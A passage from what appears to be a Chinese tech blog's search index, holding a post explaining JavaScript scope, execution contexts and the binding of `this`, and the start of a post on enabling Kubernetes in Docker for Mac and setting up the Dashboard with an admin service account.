href=\"https://www.jianshu.com/p/6726623123a7\">ES5&#x2F;ES6 的继承除了写法以外还有什么区别?</a></li>\n</ul>\n"},{"title":"JavaScript技术分析之二：this指向哪里","url":"/2022/06/05/JavaScript%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E4%BA%8C%EF%BC%9Athis%E6%8C%87%E5%90%91%E5%93%AA%E9%87%8C/","content":"<h2 id=\"一、作用域\"><a href=\"#一、作用域\" class=\"headerlink\" title=\"一、作用域\"></a>一、作用域</h2><p>作用域（Scope），是指程序源代码中定义变量的区域作用域。<br>作用域规定了如何查找变量，也就是确定当前执行代码对变量的访问权限。其核心任务就是隔离变量，以确保在不同作用域下的同名变量不会发生冲突。<br>作用域有两种不同的设计思路，分别是静态作用域和动态作用域。</p>\n<h3 id=\"静态作用域\"><a href=\"#静态作用域\" class=\"headerlink\" title=\"静态作用域\"></a>静态作用域</h3><p>静态作用域是指函数的作用域在<strong>定义</strong>的时候就确定了，本质是在<strong>编译阶段</strong>就以唯一标志符的形式确定了作用域。<br>C++、Java等大多数语言都采用静态作用域，JavaScript自称为词法作用域(lexical scoping)。</p>\n<p>JavaScript有三种作用域：</p>\n<ul>\n<li>全局作用域：在函数定义之外声明的变量是全局变量，它的值可在整个程序中访问和修改，默认是<code>window</code></li>\n<li>函数作用域：在函数定义内声明的变量是局部变量。每当执行函数时，都会创建和销毁该变量，且无法通过函数之外的任何代码访问该变量。</li>\n<li>块级作用域：ES6 新增<code>let</code>命令替代<code>var</code>，通过<code>let</code>和<code>const</code>实现了块级作用域的变量声明。<br>  块级作用域的出现，有效避免由于变量提升导致的变量污染的问题，实际上使得匿名立即执行函数表达式（匿名 IIFE）不再必要了。<br>  允许在块级作用域之中声明函数，函数声明语句的行为类似于let，在块级作用域之外不可引用。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> value = ‘<span class=\"variable language_\">global</span>’;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(value);     <span class=\"comment\">// 内部没有value变量，从foo函数定义时的环境中找到value</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">bar</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value = ‘local’;  </span><br><span class=\"line\">    <span class=\"title function_\">foo</span>();                  <span class=\"comment\">// bar()调用foo()</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">bar</span>();                      <span class=\"comment\">// 输出 = ‘global’</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"动态作用域\"><a href=\"#动态作用域\" class=\"headerlink\" title=\"动态作用域\"></a>动态作用域</h3><p>动态作用域是指函数的作用域是在函数<strong>调用</strong>的时候才决定，本质是在<strong>执行阶段</strong>才动态解释确定作用域，换句话说就没有编译阶段。<br>采用动态作用域主要是Bash等脚本语言，以及Emacs Lisp、Common Lisp（兼有静态作用域）和Perl（兼有静态作用域）。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">value=‘global’</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">foo</span></span> () &#123;</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"variable\">$value</span>;                <span class=\"comment\"># 内部没有value变量，从调用函数bar的作用域找到value</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">bar</span></span> () &#123;</span><br><span class=\"line\">    <span class=\"built_in\">local</span> value=‘<span class=\"built_in\">local</span>’;</span><br><span class=\"line\">    foo;                        <span class=\"comment\"># bar()调用foo()</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">bar                             <span class=\"comment\"># 输出 = ‘local‘</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、执行上下文\"><a href=\"#二、执行上下文\" class=\"headerlink\" title=\"二、执行上下文\"></a>二、执行上下文</h2><p>执行上下文（Execution Context），就是当前JS代码被解析和执行时所在环境的抽象概念。<br>执行上下文有三种类型：</p>\n<ul>\n<li>全局执行上下文：这是默认的、最基础的执行上下文，JS代码运行起来会首先进入该环境，创建一个全局对象window，并将this指向window</li>\n<li>函数执行上下文：每个函数都拥有自己的执行上下文，但是仅在函数被调用的时候才会被创建</li>\n<li>eval函数执行上下文：<code>eval</code>命令将字符串当做语句执行。一般来说，eval没有自己的作用域，都在当前作用域内执行，但也要看是否采用strict模式，以及具体的调用方式</li>\n</ul>\n<blockquote>\n<p>一般不建议开发环境使用eval，因为可能存在安全问题，而且影响性能</p>\n</blockquote>\n<h3 id=\"堆栈实现分析\"><a href=\"#堆栈实现分析\" class=\"headerlink\" title=\"堆栈实现分析\"></a>堆栈实现分析</h3><p>由于Javavscript是单线程的，JS引擎在初始化执行代码时会建立一个堆栈，被称为<strong>执行上下文栈</strong>（Execution Context Stack，ECS），用于配合<strong>函数调用栈</strong>（Call Stack）的执行。</p>\n<ul>\n<li>首先，创建一个全局执行上下文</li>\n<li>每次函数的调用都会创建并压入一个新的执行上下文栈</li>\n<li>处于栈顶的上下文执行完毕之后，就会自动出栈</li>\n<li>重复上述操作，直到全局执行上下文全部执行完毕</li>\n</ul>\n<p><img src=\"/2022/06/05/JavaScript%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E4%BA%8C%EF%BC%9Athis%E6%8C%87%E5%90%91%E5%93%AA%E9%87%8C/stack.jpg\" alt=\"堆栈示例\"></p>\n<h3 id=\"生命周期分析\"><a href=\"#生命周期分析\" class=\"headerlink\" title=\"生命周期分析\"></a>生命周期分析</h3><p>执行上下文的生命周期包括三个阶段：创建阶段 → 执行阶段 → 回收阶段。</p>\n<p><img src=\"/2022/06/05/JavaScript%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E4%BA%8C%EF%BC%9Athis%E6%8C%87%E5%90%91%E5%93%AA%E9%87%8C/context.png\" alt=\"执行上下文的生命周期\"></p>\n<h4 id=\"创建阶段\"><a href=\"#创建阶段\" class=\"headerlink\" title=\"创建阶段\"></a>创建阶段</h4><p>当函数被调用，但未执行任何其内部代码之前，将创建执行上下文。<br>以全局上下文为例，其数据结构如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title class_\">ExecutionContextObj</span> = &#123;</span><br><span class=\"line\">    <span class=\"title class_\">VariableObject</span>: <span class=\"variable language_\">window</span>,     <span class=\"comment\">// 创建变量对象</span></span><br><span class=\"line\">    <span class=\"title class_\">ScopeChain</span>: &#123;&#125;,             <span class=\"comment\">// 创建作用域链</span></span><br><span class=\"line\">    <span class=\"attr\">this</span>: <span class=\"variable language_\">window</span>                <span class=\"comment\">// 设置this指针</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>在创建阶段，主要做三件事：</p>\n<ol>\n<li>创建并存储变量对象<ul>\n<li>初始化函数的参数 arguments</li>\n<li>提升函数声明(function declarations)</li>\n<li>提升变量声明 (variables declarations)</li>\n</ul>\n</li>\n<li>创建作用域链用于变量解析<ul>\n<li>设置有权访问的变量和访问顺序，包含本作用域变量和所有父作用域变量。</li>\n<li>即函数内部属性 scope : 本函数有权访问的[变量、对象、函数]的集合</li>\n<li>当被要求解析变量时，JavaScript 始终从代码嵌套的最内层开始，如果最内层没有找到变量，就会跳转到上一层父作用域中查找，直到找到该变量。</li>\n</ul>\n</li>\n<li>确定this指针<ul>\n<li>this指针是一个与执行上下文相关的特殊对象，也被称之为上下文对象</li>\n<li>函数的执行过程中调用位置决定 this 的 绑定对象。</li>\n</ul>\n</li>\n</ol>\n<h4 id=\"执行阶段\"><a href=\"#执行阶段\" class=\"headerlink\" title=\"执行阶段\"></a>执行阶段</h4><ol>\n<li>执行变量赋值</li>\n<li>代码执行</li>\n</ol>\n<h4 id=\"回收阶段\"><a href=\"#回收阶段\" class=\"headerlink\" title=\"回收阶段\"></a>回收阶段</h4><ol>\n<li>执行上下文出栈</li>\n<li>等待虚拟机回收执行上下文</li>\n</ol>\n<h2 id=\"三、this的指向\"><a href=\"#三、this的指向\" class=\"headerlink\" title=\"三、this的指向\"></a>三、this的指向</h2><blockquote>\n<p>In most cases, the value of this is determined by how a function is called. It can’t be set by assignment during execution, and it may be different each time the function is called.</p>\n</blockquote>\n<p>大多数情况下，this总是指向调用该函数的对象。<br>在函数执行期间，this不能通过赋值操作被重置，而且每次函数被调用都可能不一样。<br>也就是说，this是在运行时才能确认的，而非定义时确认的。</p>\n<p>在全局上下文中，无论非严格模式还是严格模式，this指的是全局对象。</p>\n<ul>\n<li>当你在浏览器中工作时，this将指向全局变量window</li>\n<li>当你在 Node.js 中工作时，this将指向全局变量global</li>\n<li>但是，如果使用严格模式（’use strict’）时，this将指向undefined</li>\n</ul>\n<p>比较复杂的是函数上下文，主要有以下典型场景：</p>\n<h3 id=\"1-独立函数调用\"><a href=\"#1-独立函数调用\" class=\"headerlink\" title=\"1. 独立函数调用\"></a>1. 独立函数调用</h3><p>作为独立函数，其上层调用必然是全局上下文，this将指向全局变量window。<br>注意，如果工作在strict模式，this将指向undefined，而非window。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">fn1</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">a</span>);    <span class=\"comment\">// 1</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title function_\">fn1</span>();                      <span class=\"comment\">// 可以理解为 window.fn();</span></span><br></pre></td></tr></table></figure>\n\n<p>对于匿名函数，setTimeout等，也是同样的规则。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>);      <span class=\"comment\">// window</span></span><br><span class=\"line\">&#125;)();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>);      <span class=\"comment\">// window</span></span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>);      <span class=\"comment\">// window</span></span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-对象方法调用\"><a href=\"#2-对象方法调用\" class=\"headerlink\" title=\"2. 对象方法调用\"></a>2. 对象方法调用</h3><p>在面向对象程序设计中，当函数（Function）作为对象属性时被称为方法（Method）。<br>方法被调用时this会被绑定到对应的对象，与所在方法的调用位置有关，而与方法的声明位置无关。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> testObj = &#123;</span><br><span class=\"line\">    <span class=\"attr\">val</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"attr\">getVal</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> val = <span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"property\">val</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(testObj.<span class=\"title function_\">getVal</span>());      <span class=\"comment\">// 1，this指向对象实例</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-构造函数调用\"><a href=\"#3-构造函数调用\" class=\"headerlink\" title=\"3. 构造函数调用\"></a>3. 构造函数调用</h3><p>当一个函数的调用者是构造函数，this指向新构造出来的对象。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&#x27;use strict&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">testFunc</span>(<span class=\"params\">val</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">a</span> = val;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">b</span> = <span class=\"string\">&#x27;bb&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> testInstance = <span class=\"keyword\">new</span> <span class=\"title function_\">testFunc</span>(<span class=\"string\">&#x27;aa&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(testInstance.<span class=\"property\">a</span>); <span class=\"comment\">// aa</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(testInstance.<span class=\"property\">b</span>); <span class=\"comment\">// bb    </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-显式绑定调用\"><a href=\"#4-显式绑定调用\" class=\"headerlink\" title=\"4. 显式绑定调用\"></a>4. 显式绑定调用</h3><p>bind、apply、call都是用于改变函数体内this的指向。</p>\n<ul>\n<li>apply和call都是为了改变某个函数运行时的上下文而存在的，apply和call的调用返回函数执行结果，区别仅是参数传递方式不同</li>\n<li>bind的特点是不会立即调用，而是返回一个新函数，称为绑定函数，其内的this指向为创建它时传入bind的第一个参数，而传入bind的第二个及以后的参数作为原函数的参数来调用原函数</li>\n</ul>\n<h4 id=\"apply\"><a href=\"#apply\" class=\"headerlink\" title=\"apply\"></a>apply</h4><p><code>fun.apply(thisArg, [argsArray])</code></p>\n<ul>\n<li>thisArg： 在 fun 函数运行时指定的 this 值。需要注意的是，指定的 this 值并不一定是该函数执行时真正的 this 值，如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动指向全局对象（浏览器中就是window对象），同时值为原始值（数字，字符串，布尔值）的 this 会指向该原始值的自动包装对象。</li>\n<li>argsArray: 一个数组或者类数组对象，其中的数组元素将作为单独的参数传给 fun 函数。如果该参数的值为null 或 undefined，则表示不需要传入任何参数。从ECMAScript 5 开始可以使用类数组对象。</li>\n</ul>\n<h4 id=\"call\"><a href=\"#call\" class=\"headerlink\" title=\"call\"></a>call</h4><p><code>fun.call(thisArg, arg1, arg2, ...)</code></p>\n<ul>\n<li>thisArg:：在fun函数运行时指定的this值。需要注意的是，指定的this值并不一定是该函数执行时真正的this值，如果这个函数处于非严格模式下，则指定为null和undefined的this值会自动指向全局对象(浏览器中就是window对象)，同时值为原始值(数字，字符串，布尔值)的this会指向该原始值的自动包装对象。</li>\n<li>arg1, arg2, … ：指定的参数列表。</li>\n</ul>\n<h4 id=\"bind\"><a href=\"#bind\" class=\"headerlink\" title=\"bind\"></a>bind</h4><p><code>func.bind(thisArg[, arg1[, arg2[, ...]]])</code></p>\n<ul>\n<li>thisArg：当绑定函数被调用时，该参数会作为原函数运行时的this指向。当使用new 操作符调用绑定函数时，该参数无效。</li>\n<li>arg1, arg2, … ：当绑定函数被调用时，这些参数将置于实参之前传递给被绑定的方法。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">test</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span> === obj);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">test</span>(); <span class=\"comment\">//false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> testObj = test.<span class=\"title function_\">bind</span>(obj);</span><br><span class=\"line\"><span class=\"title function_\">testObj</span>();  <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"5-箭头函数\"><a href=\"#5-箭头函数\" class=\"headerlink\" title=\"5. 箭头函数\"></a>5. 箭头函数</h3><p>箭头函数比较特殊，它没有自己的this。它使用封闭执行上下文(函数或是global)的 this 值。箭头函数始终是匿名的。</p>\n<p>ES6规定，箭头函数会继承外层函数，调用的 this 绑定（ 无论 this 绑定到什么），没有外层函数，则是绑定到全局对象（浏览器中是window）。这其实和 ES5 代码中的 <code>self = this</code> 机制一样。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">GLOBAL</span>.<span class=\"property\">a</span> = <span class=\"string\">&#x27;global aa&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> testObj = &#123;</span><br><span class=\"line\">    <span class=\"attr\">a</span>: <span class=\"string\">&#x27;aa&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">getValArrowFuc</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> val = (<span class=\"function\">() =&gt;</span> <span class=\"variable language_\">this</span>.<span class=\"property\">a</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_\">val</span>();</span><br><span class=\"line\">    &#125;,                                 </span><br><span class=\"line\">    <span class=\"attr\">getVal</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> self = <span class=\"variable language_\">this</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> val = <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.<span class=\"property\">a</span>;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_\">val</span>();</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"attr\">getValGlobal</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> val = <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"property\">a</span>;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_\">val</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(testObj.<span class=\"title function_\">getValArrowFuc</span>());          <span class=\"comment\">// aa</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(testObj.<span class=\"title function_\">getVal</span>());                  <span class=\"comment\">// aa</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(testObj.<span class=\"title function_\">getValGlobal</span>());            <span class=\"comment\">// global aa</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"附录一：执行上下文的示例分析\"><a href=\"#附录一：执行上下文的示例分析\" class=\"headerlink\" title=\"附录一：执行上下文的示例分析\"></a>附录一：执行上下文的示例分析</h2><p>以下面的JS程序例子为例。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> scope = <span class=\"string\">&#x27;global scope&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">checkscope</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> scope2 = <span class=\"string\">&#x27;local scope&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> scope2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">checkscope</span>();</span><br></pre></td></tr></table></figure>\n\n<p>其实际的执行过程如下：</p>\n<ol>\n<li><p>checkscope 函数被创建，保存作用域链到内部属性 [[Scopes]]</p>\n <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">checkscope.[[<span class=\"title class_\">Scopes</span>]] = [</span><br><span class=\"line\">    globalContext.<span class=\"property\">VO</span></span><br><span class=\"line\">];</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>执行 checkscope 函数，创建 checkscope 函数执行上下文，checkscope 函数执行上下文被压入执行上下文栈</p>\n<p> <code>ECStack = [checkscopeContext, globalContext];</code></p>\n</li>\n<li><p>checkscope 函数并不立刻执行，开始做准备工作，首先复制函数 [[Scopes]] 属性创建作用域链</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">checkscopeContext = &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Scopes</span>: checkscope.[[<span class=\"title class_\">Scopes</span>]],</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>用 arguments 创建活动对象，随后初始化活动对象，加入形参、函数声明、变量声明</p>\n <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">checkscopeContext = &#123;</span><br><span class=\"line\">    <span class=\"attr\">AO</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">arguments</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">length</span>: <span class=\"number\">0</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">scope2</span>: <span class=\"literal\">undefined</span></span><br><span class=\"line\">    &#125;，</span><br><span class=\"line\">    <span class=\"title class_\">Scopes</span>: checkscope.[[<span class=\"title class_\">Scopes</span>]],</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>将活动对象压入 checkscope 作用域链顶端</p>\n <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">checkscopeContext = &#123;</span><br><span class=\"line\">    <span class=\"attr\">AO</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">arguments</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">length</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">scope2</span>: <span class=\"literal\">undefined</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"title class_\">Scopes</span>: [<span class=\"variable constant_\">AO</span>, [[<span class=\"title class_\">Scopes</span>]]],</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>准备工作做完，开始执行函数，随着函数的执行，修改 AO 的属性值</p>\n <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">checkscopeContext = &#123;</span><br><span class=\"line\">    <span class=\"attr\">AO</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">arguments</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">length</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">scope2</span>: <span class=\"string\">&#x27;local scope&#x27;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"title class_\">Scopes</span>: [<span class=\"variable constant_\">AO</span>, [[<span class=\"title class_\">Scopes</span>]]],</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查找到 scope2 的值，返回后函数执行完毕，函数上下文从执行上下文栈中弹出</p>\n<p> <code>ECStack = [globalContext];</code></p>\n</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://tsejx.github.io/javascript-guidebook/core-modules/executable-code-and-execution-contexts/execution/execution-context-stack\">JavaScript Guidebook</a></li>\n<li><a href=\"https://www.ruanyifeng.com/blog/2018/06/javascript-this.html\">JavaScript的this原理 - 阮一峰</a></li>\n<li><a href=\"https://blog.fundebug.com/2019/03/20/understand-javascript-context-and-stack/\">深入理解 JavaScript 执行上下文和执行栈</a></li>\n<li><a href=\"https://juejin.cn/post/6981251280236707853\">JavaScript的this指向详解</a></li>\n<li><a href=\"https://juejin.cn/post/6844903746984476686\">面试官问：JS的this指向</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000016705780\">bind、call、apply的区别</a></li>\n<li><a href=\"https://www.bennadel.com/blog/1926-exploring-javascripts-eval-capabilities-and-closure-scoping.htm\">Exploring Javascript’s eval() Capabilities And Closure Scoping</a></li>\n</ul>\n"},{"title":"Kubernetes for Mac的安装方法和问题记录","url":"/2019/04/01/Kubernetes-for-Mac%E7%9A%84%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95%E5%92%8C%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"安装Kubernetes的最简单方法\"><a href=\"#安装Kubernetes的最简单方法\" class=\"headerlink\" title=\"安装Kubernetes的最简单方法\"></a>安装Kubernetes的最简单方法</h2><p>著名的Docker三剑客，Docker + Docker-compose + Docker Swarm。<br>docker-compose比较简单，适用于单机的服务编排，已经得到很好的应用，但是Docker Swarm作为集群的服务编排工具，受到K8s的强烈冲击，已经缴械投降了，目前Kubernets已经集成到了Docker中。<br>最简单的安装方法，就是在菜单Docker-Preferences-Kubernetes中，Enable即可。</p>\n<img src=\"/2019/04/01/Kubernetes-for-Mac%E7%9A%84%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95%E5%92%8C%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/k8s-install.png\" class=\"\">\n<p>如果看到‘Kubernetes is running…’，就是成功加载了！！！</p>\n<h2 id=\"Dashboard的安装和启动\"><a href=\"#Dashboard的安装和启动\" class=\"headerlink\" title=\"Dashboard的安装和启动\"></a>Dashboard的安装和启动</h2><p>Kubernetes Dashboard是k8s集群的一个WEB UI管理工具。<br>代码托管在<a href=\"https://github.com/kubernetes/dashboard\">https://github.com/kubernetes/dashboard</a></p>\n<ul>\n<li>部署并启动Dashboard组件</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>启动proxy代理服务，提供外部访问Kubernetes cluster</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ kubectl proxy</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>浏览器打开UI界面，URL地址是：<br><a href=\"http://localhost:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/\">http://localhost:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/</a></p>\n<p><strong>注意：版本v1.8.3可以跳过认证方式</strong></p>\n</li>\n</ul>\n<h2 id=\"如何创建Dashboard的认证鉴权文件（基于v1-10-1版本）\"><a href=\"#如何创建Dashboard的认证鉴权文件（基于v1-10-1版本）\" class=\"headerlink\" title=\"如何创建Dashboard的认证鉴权文件（基于v1.10.1版本）\"></a>如何创建Dashboard的认证鉴权文件（基于v1.10.1版本）</h2><p>NOTE: apiVersion of ClusterRoleBinding resource may differ between Kubernetes versions. Prior to Kubernetes v1.8 the apiVersion was rbac.authorization.k8s.io&#x2F;v1beta1.</p>\n<ul>\n<li>创建权限文件<code>dashboard-adminuser.yaml</code></li>\n</ul>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ServiceAccount</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">admin-user</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">kube-system</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ClusterRoleBinding</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">admin-user</span></span><br><span class=\"line\"><span class=\"attr\">roleRef:</span></span><br><span class=\"line\">  <span class=\"attr\">apiGroup:</span> <span class=\"string\">rbac.authorization.k8s.io</span></span><br><span class=\"line\">  <span 